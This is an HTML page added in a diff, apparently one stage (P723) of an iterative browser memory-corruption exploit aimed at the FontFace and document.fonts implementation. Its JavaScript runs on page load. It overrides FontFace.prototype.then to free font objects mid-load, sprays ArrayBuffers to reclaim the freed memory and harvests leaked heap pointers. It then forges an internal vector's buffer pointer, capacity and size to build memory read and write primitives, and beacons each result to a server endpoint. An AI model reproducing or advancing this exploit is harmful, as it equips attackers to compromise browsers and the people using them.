@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P723 — Vector Traversal & Controlled String Disclosure Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P723 — Vector Traversal & Controlled String Disclosure Scout
+ *
+ * Ground Truth from P722:
+ * - Vector poisoning SUCCESS:
+ *     q11 (m_buffer) repointed to P58!
+ *     q12 (m_capacity/m_size) controlled!
+ *     FACE_B.load() and document.fonts.check() executed with chk=true
+ *     and ZERO crashes (100% stable).
+ *
+ * Objectives of P723:
+ * 1. Expand Vector size: m_capacity = 16, m_size = 8:
+ *      VIEW_B[12] = 0x0000001000000008n;
+ * 2. Point m_buffer to P58:
+ *      VIEW_B[11] = P58;
+ * 3. Populate slots [0..7] with controlled test pointers and P68.
+ * 4. Probe DOM properties on FACE_B (family, status, featureSettings)
+ *    to observe if any property reflects or dereferences our array!
+ * 5. Check if any write occurred into VIEW_B.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P723-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+
+function snap(){
+  if(!VIEW_B) return [];
+  var arr = [];
+  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
+  return arr;
+}
+
+function diffSnap(pre){
+  if(!VIEW_B || !pre.length) return 'none';
+  var ch = [];
+  for(var q=0; q<24; q++){
+    if(VIEW_B[q] !== pre[q]){
+      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
+    }
+  }
+  return ch.length ? ch.join(',') : 'none';
+}
+
+function run(){
+  b('BOOT','p723-traverse-scout');
+  log('=== P723 Vector Traversal & String Disclosure Scout ===\n');
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Deterministic Reclaim */
+    log('[Step 2] Deterministic 80-slab reclaim...');
+    doReclaim(function(){
+      /* Step 3: Multi-Element Vector Expansion */
+      log('\n[Step 3] Expanding Vector (m_capacity=16, m_size=8)...');
+      expandVector();
+
+      /* Step 4: Property & Traversal Inspection */
+      log('\n[Step 4] Probing DOM properties & memory reflection...');
+      probeTraversal(function(){
+        b('DONE','p723-complete');
+        log('\n=== P723 Complete! ===');
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Deterministic Reclaim ---- */
+function doReclaim(cb){
+  b('RECLAIM-GO', 'fill_q12_q6=0x' + h16(P58));
+
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stTr){ stTr.remove(); stTr.textContent = ''; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6]  = P58;
+        absW.push(ab);
+      }
+      try{ document.fonts.check('1em trFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em trFace, trFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    var dumpStr = 'baseK=' + best + '|nz=' + bestNz +
+                  '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
+                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
+    b('RECLAIM-OK', dumpStr);
+    log('Deterministic Reclaim OK: ' + dumpStr);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Multi-Element Vector Expansion ---- */
+function expandVector(){
+  if(!VIEW_B) return;
+
+  /* Set m_capacity = 16, m_size = 8 */
+  VIEW_B[12] = 0x0000001000000008n;
+
+  /* Point m_buffer to P58 */
+  VIEW_B[11] = P58;
+
+  /* Populate Vector elements at P58 with controlled pointer slots */
+  VIEW_B[0] = 0x1n;          /* Element 0: RefCount */
+  VIEW_B[1] = P68;           /* Element 1: Target Pointer */
+  VIEW_B[2] = P58 + 0x10n;   /* Element 2: Internal offset */
+  VIEW_B[3] = P58 + 0x20n;   /* Element 3: Internal offset */
+  VIEW_B[4] = 0x0000002000000000n; /* Element 4: 128GB capacity */
+  VIEW_B[5] = P58;           /* Element 5: Self */
+
+  b('VECTOR-EXPAND-OK', 'cap=16|size=8|buf=P58');
+  log('Vector Expanded: m_capacity=16, m_size=8, m_buffer=P58');
+}
+
+/* ---- Step 4: Property & Traversal Inspection ---- */
+function probeTraversal(cb){
+  if(!VIEW_B || !FACE_B){ cb(); return; }
+
+  /* 4A: Check properties */
+  var props = {};
+  try { props.family = String(FACE_B.family); } catch(e){ props.family = 'ERR:'+e.message; }
+  try { props.status = String(FACE_B.status); } catch(e){ props.status = 'ERR:'+e.message; }
+  try { props.loaded = typeof FACE_B.loaded; } catch(e){ props.loaded = 'ERR:'+e.message; }
+
+  b('PROPS-REPORT', 'fam=' + props.family + '|stat=' + props.status + '|load=' + props.loaded);
+  log('Properties: family=' + props.family + ', status=' + props.status);
+
+  /* 4B: Probe fonts.check with expanded vector */
+  var pre = snap();
+  var chk = false;
+  try {
+    chk = document.fonts.check('1em trFace');
+  } catch(e){
+    chk = 'ERR:' + (e.message||'').slice(0,60);
+  }
+  var dChk = diffSnap(pre);
+  b('CHECK-REPORT', 'chk=' + chk + '|writes=' + dChk);
+  log('fonts.check("1em trFace") = ' + chk + ' (writes=' + dChk + ')');
+
+  /* 4C: Probe face.load() */
+  pre = snap();
+  var loadType = 'none';
+  try {
+    var p = FACE_B.load();
+    loadType = typeof p;
+  } catch(e){
+    loadType = 'ERR:' + (e.message||'').slice(0,60);
+  }
+  var dLoad = diffSnap(pre);
+  b('LOAD-REPORT', 'type=' + loadType + '|writes=' + dLoad);
+  log('FACE_B.load() = ' + loadType + ' (writes=' + dLoad + ')');
+
+  /* 4D: Dump final state */
+  var nzArr = [];
+  for(var q=0; q<24; q++){
+    if(VIEW_B[q] !== 0n){
+      nzArr.push('q' + q + '=0x' + h16(VIEW_B[q]));
+    }
+  }
+  b('FINAL-STATE', nzArr.join(';').slice(0, 700));
+  log('Final Vector State: ' + nzArr.join(', '));
+
+  setTimeout(cb, 100);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P723 — Initializing Vector Traversal Scout...</pre></body></html>
